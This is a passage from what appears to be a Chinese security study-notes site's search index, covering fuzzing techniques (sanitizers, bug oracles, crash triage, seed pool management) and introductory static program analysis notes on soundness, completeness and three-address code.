<li>\u5728\u5206\u914d\u5bf9\u8c61\u4e4b\u95f4\u521b\u5efa\u5927\u5757\u4e0d\u53ef\u8bbf\u95ee\u5185\u5b58\u2014\u2014\u7ea2\u8272\u7a7a\u95f4\uff08redzones\uff09\uff0c\u5982\u679c\u8fd9\u4e9b\u7ea2\u8272\u7a7a\u95f4\u88ab\u6307\u9488\u8bbf\u95ee\u4e86\uff0c\u90a3\u5c31\u6709\u53ef\u80fd\u9020\u6210\u5d29\u6e83\u3002</li> <li>\u5728\u7f16\u8bd1\u65f6\u63d2\u6869\uff0c\u5c06\u8fb9\u754c\u548c\u65f6\u95f4\u4fe1\u606f\u4e0e\u6bcf\u4e2a\u6307\u9488\u76f8\u5173\u8054\uff0c\u7406\u8bba\u4e0a\u53ef\u4ee5\u68c0\u6d4b\u6240\u6709\u7684\u7a7a\u95f4\u6027\u548c\u65f6\u95f4\u6027\u9519\u8bef\u3002</li> <li>\u5728\u7f16\u8bd1\u65f6\u63d2\u6869\uff0c\u68c0\u6d4b C++\u7c7b\u578b\u8f6c\u6362\u9519\u8bef\u3002</li> <li>\u5728\u8fd0\u884c\u65f6\u68c0\u6d4b\u539f\u59cb\u7a0b\u5e8f\u4e2d\u4e0d\u53ef\u80fd\u7684\u63a7\u5236\u6d41\u8f6c\u6362\uff0c\u5982\u627e\u5230\u975e\u6cd5\u7be1\u6539\u7a0b\u5e8f\u63a7\u5236\u6d41\u7684\u6d4b\u8bd5\u7528\u4f8b\u3002</li> <li>\u672a\u5b9a\u4e49\u884c\u4e3a\uff08Undefined Behaviors\uff09</li> <li>\u5728\u7f16\u8bd1\u65f6\u63d2\u6869\uff0c\u4f7f\u7528\u5f71\u5b50\u5185\u5b58\uff08shadow memory\uff09\u6765\u8868\u793a\u6bcf\u4e2a\u53ef\u5bfb\u5740\u4f4d\u662f\u5426\u5df2\u7ecf\u88ab\u521d\u59cb\u5316\uff0c\u7528\u4e8e\u68c0\u6d4b C \u548c C++\u4e2d\u4f7f\u7528\u672a\u521d\u59cb\u5316\u5185\u5b58\u800c\u5f15\u8d77\u7684\u672a\u5b9a\u4e49\u884c\u4e3a\u3002</li> <li>\u7f16\u8bd1\u65f6\u4fee\u6539\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u68c0\u6d4b\u9519\u4f4d\u6307\u9488\u3001\u88ab\u96f6\u9664\u3001\u89e3\u5f15\u7528\u7a7a\u6307\u9488\u548c\u6574\u6570\u6ea2\u51fa\u7b49\u672a\u5b9a\u4e49\u884c\u4e3a\u3002</li> <li>\u7f16\u8bd1\u65f6\u4fee\u6539\u7a0b\u5e8f\uff0c\u68c0\u6d4b\u6570\u636e\u7ade\u4e89\uff08data races\uff09</li> <li>\u8f93\u5165\u9a8c\u8bc1\uff08Input Validation\uff09\uff1a\u5982 XSS\uff0cSQL \u6ce8\u5165\u3002</li> <li>\u4f7f\u7528\u771f\u5b9e\u7684 Web \u6d4f\u89c8\u5668\u89e3\u6790\u6d4b\u8bd5\u7528\u4f8b\uff0c\u63d0\u53d6 DOM \u6811\uff0c\u5e76\u5c06\u5b83\u4e0e\u6210\u529f\u6267\u884c XSS \u653b\u51fb\u7684\u624b\u52a8\u6307\u5b9a\u6a21\u5f0f\u8fdb\u884c\u6bd4\u8f83\u3002</li> <li>\u901a\u8fc7\u4f7f\u7528\u6570\u636e\u5e93\u4ee3\u7406\u6765\u62e6\u622a Web \u5e94\u7528\u7a0b\u5e8f\u4e0e\u6570\u636e\u5e93\u4e4b\u95f4\u7684\u901a\u4fe1\uff0c\u4ee5\u6b64\u68c0\u6d4b\u662f\u5426\u89e6\u53d1\u6709\u5bb3\u884c\u4e3a\u3002</li> <li>\u8bed\u4e49\u5dee\u5f02\uff08Semantic Difference\uff09</li> <li>\u4e0e\u884c\u4e3a\u76f8\u4f3c\uff08\u4f46\u4e0d\u76f8\u540c\uff09\u7684\u7a0b\u5e8f\u76f8\u6bd4\u8f83\uff0c\u4e4b\u95f4\u7684\u5dee\u5f02\u53ef\u80fd\u5c31\u662f\u9519\u8bef\u3002</li> <li>\u5728\u5355\u4e2a\u7a0b\u5e8f\u4e0a\u4f7f\u7528\u591a\u4e2a\u4e0d\u540c\u7684\u8f93\u5165\u8fdb\u884c\u6d4b\u8bd5\u6d4b\u8bd5\uff0c\u5c06\u7a81\u53d8\u4ece PUT \u7684\u8f93\u5165\u6620\u5c04\u5230\u5b83\u7684\u8f93\u51fa\uff0c\u53ef\u4ee5\u7528\u6765\u8bc6\u522b\u4fe1\u606f\u6cc4\u6f0f\u3002</li> </ul>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/Fuzzing/#execution-optimizations","title":"Execution Optimizations","text":"<p>\u6bcf\u4e00\u6b21 fuzz \u8fed\u4ee3\u90fd\u9700\u8981\u91cd\u65b0\u5f00\u542f\u4e00\u4e2a\u8fdb\u7a0b\u52a0\u8f7d PUT\uff0c\u5f88\u6d6a\u8d39\u6027\u80fd\u3002\u73b0\u5728\u7684 Fuzzer \u63d0\u4f9b\u4e00\u4e2a fork-server\uff0c\u6bcf\u4e00\u6b21\u65b0\u7684 fuzz \u8fed\u4ee3\u53ef\u4ee5\u5bf9\u5df2\u7ecf\u521d\u59cb\u5316\u7684\u8fdb\u7a0b\u8fdb\u884c fork\uff0c\u964d\u4f4e\u8fed\u4ee3\u7684\u5f00\u9500\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/Fuzzing/#triage","title":"Triage","text":"<p>\u5206\u6790\u548c\u62a5\u544a\u8fdd\u53cd\u7b56\u7565\u6d4b\u8bd5\u7528\u4f8b\u7684\u8fc7\u7a0b\uff0c\u5206\u4e3a\u4e09\u4e2a\u6b65\u9aa4\uff1a\u91cd\u590d\u6570\u636e\u5220\u9664\uff0c\u4f18\u5148\u7ea7\u548c\u6d4b\u8bd5\u7528\u4f8b\u6700\u5c0f\u5316\u3002</p> <ul> <li> <p>\u91cd\u590d\u6570\u636e\u5220\u9664\uff08Deduplication\uff09\uff1a\u5220\u9664\u7ed3\u679c\u4e2d\u89e6\u53d1\u76f8\u540c\u9519\u8bef\u7684\u6d4b\u8bd5\u7528\u4f8b\u7684\u8fc7\u7a0b\uff0c\u7406\u60f3\u60c5\u51b5\u4e0b\uff0c\u6bcf\u4e2a\u6d4b\u8bd5\u7528\u4f8b\u90fd\u4f1a\u89e6\u53d1\u4e00\u4e2a\u72ec\u7279\u7684\u9519\u8bef\u3002\u53ef\u4ee5\u51cf\u5c11\u786c\u76d8\u7a7a\u95f4\u7684\u6d6a\u8d39\u548c\u65b9\u4fbf\u7528\u6237\u66f4\u7b80\u5355\u7406\u89e3\u7ed3\u679c\u3002</p> </li> <li> <p>\u5806\u6808\u56de\u6eaf\u54c8\u5e0c\uff08Stack Backtrace Hashing\uff09\uff1a\u5728\u7a0b\u5e8f\u5d29\u6e83\u662f\u8bb0\u5f55\u5806\u6808\u56de\u6eaf\uff0c\u5e76\u66f4\u5177\u56de\u6eaf\u5185\u5bb9\u5206\u914d\u5806\u54c8\u5e0c\u3002</p> <ul> <li>\u53ea\u5bf9\u51fd\u6570\u540d\u6216\u51fd\u6570\u5730\u5740\u8fdb\u884c\u54c8\u5e0c\u8fd0\u7b97\u3002</li> <li>\u540c\u65f6\u5bf9\u51fd\u6570\u540d\u548c\u504f\u79fb\u91cf\u6216\u884c\u8fdb\u884c\u54c8\u5e0c\u8fd0\u7b97\u3002</li> <li>\u4f7f\u7528\u4e24\u4e2a\u54c8\u5e0c\uff1a\u4e00\u4e2a\u4e3b\u8981\u54c8\u5e0c\uff0c\u53ea\u5bf9\u51fd\u6570\u540d\u8fdb\u884c\u54c8\u5e0c\u8fd0\u7b97\uff0c\u5c06\u4e0d\u540c\u5d29\u6e83\u7ec4\u5408\u5728\u4e00\u8d77\u3002\u6b21\u8981\u54c8\u5e0c\uff0c\u5bf9\u51fd\u6570\u540d\u548c\u884c\u53f7\uff0c\u8fd8\u53ef\u80fd\u5305\u62ec\u4e0d\u9650\u6570\u91cf\u7684\u5806\u6808\u5e27\uff0c\u8fdb\u884c\u54c8\u5e0c\uff0c\u66f4\u7cbe\u786e\u3002</li> </ul> </li> <li> <p>\u57fa\u4e8e\u8986\u76d6\u7684\u91cd\u590d\u6570\u636e\u5220\u9664\uff08Coverage-based Deduplication\uff09</p> <ul> <li> <p>\u8bb0\u5f55 PUT \u6bcf\u6761\u8fb9\u7684\u6267\u884c\u8986\u76d6\u7387\uff0c\u5e76\u7c97\u7565\u8ba1\u7b97\u6bcf\u6761\u8fb9\u547d\u4e2d\u6b21\u6570\u3002</p> </li> <li> <p>\u8bed\u4e49\u611f\u77e5\u5206\u6790\u91cd\u590d\u6570\u636e\u5220\u9664\uff08Semantics-aware Deduplication\uff09</p> </li> <li> <p>\u4ece\u6bcf\u4e2a\u5d29\u6e83\u4e2d\u8fdb\u884c\u53cd\u5411\u6570\u636e\u6d41\u5206\u6790\uff0c\u518d\u4ece\u5206\u6790\u4e2d\u6062\u590d\u8bed\u4e49\u3002</p> </li> </ul> </li> <li> <p>\u4f18\u5148\u7ea7\u548c\u53ef\u5229\u7528\u7a0b\u5ea6\uff08Prioritization and Exploitability\uff09</p> </li> <li> <p>\u6839\u636e\u4e25\u91cd\u7a0b\u5ea6\u548c\u72ec\u7279\u6027\u5bf9\u6709\u95ee\u9898\u7684\u6d4b\u8bd5\u7528\u4f8b\u8fdb\u884c\u5206\u7ec4\u548c\u6392\u540d\u3002</p> </li> <li> <p>\u4f7f\u7528\u7b80\u5355\u6c61\u70b9\u5206\u6790\u8fdb\u884c\u5206\u7ea7\u3002</p> </li> <li> <p>\u6d4b\u8bd5\u7528\u4f8b\u6700\u5c0f\u5316\uff08Test case minimization\uff09\uff1a\u4fdd\u8bc1\u7ed3\u679c\u4e0d\u53d8\u7684\u524d\u63d0\u4e0b\u5c3d\u53ef\u80fd\u51cf\u5c0f\u6d4b\u8bd5\u7528\u4f8b\u7684\u5927\u5c0f\u3002</p> </li> <li> <p>\u5c1d\u8bd5\u6700\u5c0f\u5316\u4e0e\u539f\u59cb\u79cd\u5b50\u6587\u4ef6\u4e0d\u540c\u7684\u4f4d\u6570\u3002</p> </li> <li>\u5c1d\u8bd5\u901a\u8fc7\u5728\u5408\u9002\u7684\u60c5\u51b5\u4e0b\u5c06\u5b57\u8282\u8bbe\u7f6e\u4e3a\u96f6\u548c\u7f29\u77ed\u6d4b\u8bd5\u7528\u4f8b\u7684\u957f\u5ea6\u6765\u7b80\u5316\u6d4b\u8bd5\u7528\u4f8b\u3002</li> <li>\u5c1d\u8bd5\u901a\u8fc7\u4ee5\u6307\u6570\u9012\u51cf\u7684\u65b9\u5f0f\u5220\u9664\u76f8\u90bb\u884c\u6216\u5b57\u8282\u5757\u6765\u6700\u5c0f\u5316\u6587\u4ef6\u3002</li> </ul>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/Fuzzing/#configuration-update","title":"CONFIGURATION UPDATE","text":"<p>\u9ed1\u76d2\u9664\u4e86\u8bc4\u4f30 BUG ORACLE \u4e4b\u5916\uff0c\u6bcf\u4e00\u6b21\u8fed\u4ee3\u90fd\u4e0d\u80fd\u591f\u6536\u96c6\u5230\u5176\u4ed6\u4efb\u4f55\u4fe1\u606f\uff0c\u4ece\u800c\u65e0\u6cd5\u66f4\u65b0\u914d\u7f6e\u4fe1\u606f\uff1b\u800c\u767d\u7070\u76d2\u53ef\u4ee5\u901a\u8fc7\u8fed\u4ee3\u540e\u5f97\u5230\u7684\u4fe1\u606f\u4e0d\u65ad\u66f4\u65b0\u914d\u7f6e\u4fe1\u606f\u3002\u56e0\u6b64\uff0cCONFUPDATE \u51fd\u6570\u53ef\u4ee5\u4f5c\u4e3a\u533a\u5206\u9ed1\u76d2\u548c\u767d\u7070\u76d2\u884c\u4e3a\u7684\u91cd\u8981\u89d2\u8272\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/Fuzzing/#evolutionary-seed-pool-update","title":"Evolutionary Seed Pool Update","text":"<p>EA\uff08Evolutionary Algorithm\uff09\u7ef4\u62a4\u4e00\u4e2a\u79cd\u5b50\u6c60\uff0c\u91cc\u9762\u4f1a\u5305\u542b\u4e00\u4e9b\u6709\u5e0c\u671b\u7684\u4e2a\u4f53\uff0c\u968f\u7740 fuzzing campaign \u7684\u8fdb\u884c\u4e0d\u65ad\u8fdb\u5316\uff0c\u53ef\u80fd\u5bfc\u81f4\u65b0\u7684\u79cd\u5b50\u88ab\u53d1\u73b0\u3002</p> <ul> <li>\u4f7f\u7528\u8282\u70b9\u6216\u5206\u652f\u8986\u76d6\u7387\u4f5c\u4e3a\u8ba1\u7b97\u70b9\uff1a\u5982\u679c\u6d4b\u8bd5\u7528\u4f8b\u53d1\u73b0\u65b0\u7684\u5206\u652f\u6216\u8282\u70b9\uff0c\u5219\u5c06\u5b83\u52a0\u5165\u5230\u79cd\u5b50\u6c60\u4e2d\u3002\u56e0\u6b64\uff0c\u79cd\u5b50\u6c60\u662f\u4ee3\u8868\u6240\u6709\u53ef\u8fbe\u8def\u5f84\u591a\u6837\u5316\u7684\u5de5\u5177\uff0c\u4e5f\u53ef\u4ee5\u4ee3\u8868 PUT \u5f53\u524d\u63a2\u7d22\u7684\u60c5\u51b5\u3002</li> </ul>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/Fuzzing/#maintaining-a-minset","title":"Maintaining a Minset","text":"<p>\u521b\u5efa\u65b0\u7684\u914d\u7f6e\u65f6\uff0c\u53ef\u80fd\u7ed3\u679c\u96c6\u4f1a\u975e\u5e38\u5927\u3002\u56e0\u6b64\uff0c\u6700\u597d\u662f\u80fd\u591f\u7ef4\u62a4\u4e00\u4e2a minset\uff0c\u5982\u80fd\u4f7f\u8986\u76d6\u7387\u6700\u5927\u5316\uff0c\u800c\u672c\u8eab\u6700\u5c0f\u5316\u7684\u6d4b\u8bd5\u7528\u4f8b\u96c6\u3002</p> <ul> <li>\u7ef4\u62a4\u4e00\u4e2a\u4e13\u95e8\u7528\u4e8e\u914d\u7f6e\u66f4\u65b0\u7684 minset\uff0c\u5b8c\u5168\u5220\u9664\u4e0d\u5728 minset \u4e2d\u7684\u914d\u7f6e\u3002</li> <li>\u540c\u4e0a\uff0c\u4f46\u4e0d\u5220\u9664\u914d\u7f6e\uff0c\u800c\u662f\u6807\u8bb0\u5728 minset \u4e2d\u7684\u914d\u7f6e\u4f18\u5148\u7ea7\u66f4\u9ad8\uff0c\u88ab\u7528\u4e8e\u6d4b\u8bd5\u7684\u673a\u4f1a\u66f4\u9ad8\uff0c\u8fd9\u6837\u5408\u7406\u4fdd\u6301\u4e86\u961f\u5217\u5faa\u73af\u901f\u5ea6\u548c\u6d4b\u8bd5\u7528\u4f8b\u591a\u6837\u6027\u4e4b\u95f4\u7684\u5e73\u8861\u3002</li> </ul>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/","title":"\u5357\u4eac\u5927\u5b66\u300a\u8f6f\u4ef6\u5206\u6790\u300b","text":"<p>Reference from Static Program Analysis</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#introduction","title":"Introduction","text":"<p>\u5bf9\u4e8e\u4e00\u4e2a\u7a0b\u5e8f\u8bed\u8a00\uff0c\u53ef\u4ee5\u5927\u81f4\u7406\u89e3\u4e3a\u4e09\u4e2a\u90e8\u5206\uff1a</p> <ul> <li>Theory\uff1a\u7406\u8bba\u90e8\u5206\uff0c\u5305\u542b\u7a0b\u5e8f\u7684\u8bbe\u8ba1\u3001\u8bed\u4e49\u903b\u8f91\u7b49</li> <li>Environment\uff1a\u8fd0\u884c\u6240\u9700\u7684\u73af\u5883\uff0c\u7f16\u8bd1\u5668\u7b49</li> <li>Application\uff1a\u7a0b\u5e8f\u7684\u5e94\u7528\uff0c\u4e3a\u4e86\u4fdd\u8bc1\u6240\u5199\u7a0b\u5e8f\u7684\u5065\u58ee\u6027\uff0c\u9700\u8981\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u5206\u6790\u548c\u9a8c\u8bc1\uff01</li> </ul> <p></p> <p>\u5728\u8fd1\u5341\u5e74\u7684\u7a0b\u5e8f\u8bed\u8a00\u53d1\u5c55\u8fc7\u7a0b\u4e2d\uff0c<code>language cores</code> \u51e0\u4e4e\u6ca1\u6709\u53d8\u5316\uff0c\u4f46\u662f\u57fa\u4e8e\u7f16\u7a0b\u8bed\u8a00\u6240\u7f16\u5199\u7684 <code>program</code> \u8d8a\u6765\u8d8a\u590d\u6742\u3002\u56e0\u6b64\uff0c\u5982\u4f55\u4fdd\u8bc1\u590d\u6742\u7a0b\u5e8f\u7684\u53ef\u9760\u6027\u3001\u5b89\u5168\u6027\u3001\u9ad8\u6548\u6027\u5462\uff1f</p> <p>\u9759\u6001\u7a0b\u5e8f\u5206\u6790\u662f\u5176\u4e2d\u4e00\u79cd\u529e\u6cd5\uff0c\u5b83\u53ef\u4ee5\u505a\u5230\uff1a</p> <ul> <li>Program Reliability\uff1aNull pointer dereference, memory leak, etc.</li> <li>Program Security\uff1aPrivate information leak, injection attack, etc.</li> <li>Compiler Optimization\uff1aDead code elimination, code motion, etc.</li> <li>Program Understanding\uff1a</li> <li>IDE call hierarchy\uff1a\u73b0\u4ee3 IDE \u901a\u8fc7\u9759\u6001\u5206\u6790\uff0c\u4f8b\u5982\uff0c\u53ef\u4ee5\u5b9e\u73b0\u5f53\u4f60\u9f20\u6807\u653e\u5728\u53d8\u91cf\u540d\u65f6\uff0c\u663e\u793a\u53d8\u91cf\u5f15\u7528\u60c5\u51b5\u7b49\u529f\u80fd</li> <li>type indication</li> </ul> <p>\u6b64\u5916\uff0c\u5b66\u4e60\u9759\u6001\u7a0b\u5e8f\u5206\u6790\uff0c\u4e5f\u53ef\u4ee5\u5e2e\u52a9\u66f4\u6df1\u5165\u5730\u7406\u89e3\u7f16\u7a0b\u8bed\u8a00\u7684\u8bed\u6cd5\u3001\u8bed\u4e49\uff0c\u81ea\u7136\u800c\u7136\u5730\u5199\u51fa\u66f4\u53ef\u9760\u3001\u66f4\u5b89\u5168\u3001\u66f4\u9ad8\u6548\u7684\u7a0b\u5e8f\u3002</p> <p>\u9759\u6001\u5206\u6790\u901a\u8fc7\u5206\u6790\u7a0b\u5e8f P \u6765\u63a8\u7406\u5176\u884c\u4e3a\uff0c\u5e76\u5728\u8fd0\u884c\u7a0b\u5e8f P \u4e4b\u524d\u786e\u5b9a\u5b83\u662f\u5426\u6ee1\u8db3\u67d0\u4e9b\u5c5e\u6027\uff08 properties\uff09\uff0c\u4f8b\u5982\uff1a</p> <ul> <li>P \u662f\u5426\u5f15\u7528\u7a7a\u6307\u9488\uff1f</li> <li>P \u4e2d\u662f\u5426\u5b58\u5728\u6b7b\u4ee3\u7801\uff1f</li> <li>P \u4e2d\u7684 assert \u65ad\u8a00\u4f1a\u5931\u8d25\u5417\uff1f</li> <li>...</li> </ul> <p>\u4e0d\u5e78\u7684\u662f\uff0c\u6839\u636e<code>Rice's Theorem</code>\uff0c\u76ee\u524d\u6ca1\u6709\u529e\u6cd5\u660e\u786e\u7684\u56de\u7b54\uff08Yes or No\uff09\u7a0b\u5e8f\u662f\u5426\u6ee1\u8db3<code>no-trivial properties</code>\u3002</p> <p>\u4ec0\u4e48\u662f<code>no-trivial properties</code>\uff1f</p> <p>\u5176\u5b9a\u4e49\u8f83\u4e3a\u590d\u6742\uff0c\u53ef\u4ee5\u8fd1\u4f3c\u7406\u89e3\u4e3a\uff1athe properties related with run-time behaviors of programs</p> <p>\u56e0\u6b64\uff0c\u4e0a\u8ff0\u7684\u4e09\u4e2a\u95ee\u9898\u90fd\u5c5e\u4e8e<code>no-trivial properties</code>\uff0c\u53ef\u4ee5\u8bf4\uff0c\u51e0\u4e4e\u6240\u6709\u503c\u5f97\u6211\u4eec\u611f\u5174\u8da3\u7684\u95ee\u9898\u90fd\u5c5e\u4e8e<code>no-trivial properties</code>\uff01</p> <p>\u5982\u679c\u4e00\u4e2a\u9759\u6001\u5206\u6790\uff0c\u53ef\u4ee5\u660e\u786e\u7684\u56de\u7b54\u7a0b\u5e8f\u662f\u5426\u6ee1\u8db3<code>no-trivial properties</code>\uff0c\u90a3\u8fd9\u4e2a\u9759\u6001\u5206\u6790\u79f0\u4e3a\uff1a<code>Perfect static analysis</code>\uff0c\u663e\u7136\uff0c<code>Perfect static analysis</code>\u662f \u4e0d\u5b58\u5728 \u7684\uff01</p> <p>\u6b64\u5904\u5f15\u5165<code>Sound</code>\u548c<code>Complete</code>\u7684\u6982\u5ff5\uff0c\u4e00\u4e2a<code>Perfect static analysis</code>\u662f\u65e2<code>Sound</code>\u53c8<code>Complete</code>\u7684\uff0c\u903b\u8f91\u4e0e\u7684\u5173\u7cfb\uff01</p> <p>\u663e\u7136\uff0c\u4e8c\u8005\u53ea\u80fd\u5f97\u5176\u4e00\uff0c\u6ee1\u8db3\u5176\u4e00\u7684\u79f0\u4e3a<code>Useful static analysis</code>\uff1a</p> <ul> <li> <p>\u2606Compromise completeness -&gt; sound (false positives)</p> </li> <li> <p>\u8ba9 completeness \u59a5\u534f\uff0c\u5373\u6ee1\u8db3 sound \u7279\u6027\uff0c\u4e0d\u4f1a\u6f0f\u62a5\uff0c\u53ea\u4f1a\u8bef\u62a5\uff0c\u56e0\u6b64\u4e3a false positives\u3002</p> </li> <li> <p>Compromise soundness -&gt; complete (false negatives)</p> </li> <li>\u8ba9 soundness \u59a5\u534f\uff0c\u5373\u6ee1\u8db3 complete \u7279\u6027\uff0c\u4e0d\u4f1a\u8bef\u62a5\uff0c\u53ea\u4f1a\u6f0f\u62a5\uff0c\u56e0\u6b64\u4e3a false negatives\u3002</li> </ul> <p>positives \u7684\u7a0b\u5e8f\u662f\u6709\u95ee\u9898\u7684\u7a0b\u5e8f\uff08\u9633\u6027\uff09\uff0cnegatives \u7684\u7a0b\u5e8f\u662f\u826f\u597d\u7684\u7a0b\u5e8f\uff08\u9634\u6027\uff09\u3002</p> <p>false positives\uff0c\u5373\u5047\u9633\u6027\uff0c\u628a\u826f\u597d\u7684\u7a0b\u5e8f\u8bef\u62a5\u4e3a\u6709\u95ee\u9898\u7684\u7a0b\u5e8f\u3002</p> <p>false negatives\uff0c\u5373\u5047\u9634\u6027\uff0c\u628a\u6709\u95ee\u9898\u7684\u7a0b\u5e8f\u6f0f\u62a5\u4e86\uff0c\u8ba4\u4e3a\u5176\u6ca1\u95ee\u9898\uff01</p> <p>\u6ce8\u610f\uff1a\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u4f1a\u9009\u62e9<code>Compromise completeness</code>\uff0c\u5373\u9009\u62e9\u6ee1\u8db3<code>Sound</code>\u3002</p> <p>Soundness \u7684\u5fc5\u8981\u6027\uff1a \u5982\u679c\u4e00\u4e2a\u9759\u6001\u5206\u6790\u662f<code>Sound</code>\u7684\uff0c\u90a3\u5b83\u5c31\u80fd\u591f\u8bc6\u522b\u51fa\u4e00\u5207\u6709\u95ee\u9898\u7684\u7a0b\u5e8f\uff0c\u4e0d\u4f1a\u51fa\u73b0\u6f0f\u62a5\u3002\u4f46\u5982\u679c\u4e00\u4e2a\u9759\u6001\u5206\u6790\u662f<code>Complete</code>\u7684\uff0c\u90a3\u5b83\u4e00\u5b9a\u80fd\u63a5\u6536\uff08\u9a8c\u8bc1\u901a\u8fc7\uff09\u826f\u597d\u7684\u7a0b\u5e8f\uff0c\u5373\u4e0d\u4f1a\u51fa\u73b0\u8bef\u62a5\u3002\u4f46\u662f\uff0c<code>Complete</code>\u7684\u9759\u6001\u5206\u6790\uff0c\u4f1a\u5bfc\u81f4 \u6f0f\u62a5\uff0c\u4e00\u4f46\u9759\u6001\u5206\u6790\u901a\u8fc7\u4e86\u9519\u8bef\u7684\u7a0b\u5e8f\uff0c\u90a3\u4e48\u8be5\u9519\u8bef\u5c31\u65e0\u6cd5\u88ab\u4fee\u590d\uff0c\u5bfc\u81f4\u8fd0\u884c\u65f6\u7684\u9519\u8bef\uff01</p> <p></p> <p>\u4e24\u4e2a\u5355\u8bcd\u603b\u7ed3\u9759\u6001\u5206\u6790\uff1a</p> <ul> <li>Abstraction</li> <li>Over-approximation</li> <li>Transfer functions</li> <li>Control flows</li> </ul>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#_1","title":"\u4e2d\u95f4\u8868\u793a","text":"<p>Intermediate Representation</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#compilers-and-static-analyzers","title":"Compilers and Static Analyzers","text":"<p>\u7f16\u8bd1\u5668\u5206\u4e3a\u524d\u7aef\u548c\u540e\u7aef\uff0c\u524d\u7aef\u8d1f\u8d23\u5c06\u6e90\u7801\u7f16\u8bd1\u4e3a\u4e2d\u95f4\u8868\u793a\uff0c\u540e\u7aef\u8d1f\u8d23\u5c06\u4e2d\u95f4\u8868\u793a\u7f16\u8bd1\u4e3a\u673a\u5668\u4ee3\u7801\uff0c\u5177\u4f53\u6d41\u7a0b\u5982\u4e0b\uff1a</p> <ul> <li>Scanner\uff0c\u8bcd\u6cd5\u5206\u6790\u5668\uff0c\u63a5\u53d7\u6e90\u7801\u8f93\u51fa\u5b57\u7b26\u6d41\u3002</li> <li>Parser\uff0c\u8bed\u6cd5\u5206\u6790\u5668\uff0c\u63a5\u53d7\u5b57\u7b26\u6d41\uff0c\u8f93\u51fa AST</li> <li>Type Checker\uff1a\u8bed\u4e49\u5206\u6790\u5668\uff0c\u8fdb\u884c\u7c7b\u578b\u68c0\u67e5\u7b49\u5de5\u4f5c\uff0c\u8f93\u51fa\u4e5f\u662f AST</li> <li>Translator\uff1a\u7f16\u8bd1\u5668\u4e2d\u7aef\u5c06 AST \u7ffb\u8bd1\u4e3a\u591a\u79cd\u4e2d\u95f4\u8868\u793a\uff08IR\uff09\uff0c\u5e38\u7528\u7684\u5982\u4e09\u5730\u5740\u7801\u3002\u9759\u6001\u5206\u6790\u901a\u5e38\u57fa\u4e8e IR \u8fdb\u884c\uff01</li> <li>Code Generator\uff1a\u7f16\u8bd1\u5668\u540e\u7aef\u5c06 IR \u7ffb\u8bd1\u4e3a\u673a\u5668\u4ee3\u7801</li> </ul> <p></p> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c\u60f3\u8981\u8fdb\u884c\u9759\u6001\u5206\u6790\uff0c\u5fc5\u987b\u5148\u4f7f\u7528\u7f16\u8bd1\u5668\u524d\u7aef\u5c06\u6e90\u4ee3\u7801\u7ffb\u8bd1\u4e3a IR\u3002</p> <p>\u82e5\u5c06\u7f16\u8bd1\u5668\u5206\u4e3a\u524d\u7aef\u548c\u540e\u7aef\uff0c\u5219\u524d\u7aef\u4e3a\u751f\u6210 IR \u524d\u7684\u90e8\u5206\uff0c\u540e\u7aef\u4e3a\u57fa\u4e8e IR \u751f\u6210\u76ee\u6807\u4ee3\u7801\uff08e.g. \u673a\u5668\u7801\uff09\u7684\u90e8\u5206\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#ast-vs-ir","title":"AST vs. IR","text":"<p>AST</p> <ul> <li>high-level\uff0c\u66f4\u63a5\u8fd1\u7a0b\u5e8f\u7ed3\u6784</li> <li>\u4f9d\u8d56\u6e90\u7a0b\u5e8f\u8bed\u8a00</li> <li>suitable for fast type checking</li> <li>\u7f3a\u5c11 control flow \u4fe1\u606f</li> </ul> <p>IR</p> <ul> <li>low-level\uff0c\u66f4\u63a5\u8fd1\u673a\u5668\u4ee3\u7801</li> <li>\u72ec\u7acb\u4e8e\u6e90\u7a0b\u5e8f\u8bed\u8a00</li> <li>compact and uniform</li> <li>\u5305\u542b control flow \u4fe1\u606f</li> <li>usually considered as the basis for static analysis</li> </ul>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#ir-three-address-code-3ac","title":"IR: Three-Address Code (3AC)","text":"<p>\u4e09\u5730\u5740\u7801\u6307\u4ee4\u7684\u53f3\u4fa7\u6700\u591a\u53ea\u80fd\u6709 1 \u4e2a\u8fd0\u7b97\u7b26\u3002</p> <pre><code>t2 = a + b + 3\n\n// \u8f6c\u5316\u4e3a\u4e09\u5730\u5740\u7801\nt1 = a + b\nt2 = t1 + 3\n</code></pre> <p>Address can be one of the following\uff1a</p> <ul> <li>Name\uff1aa, b</li> <li>Constant\uff1a3</li> 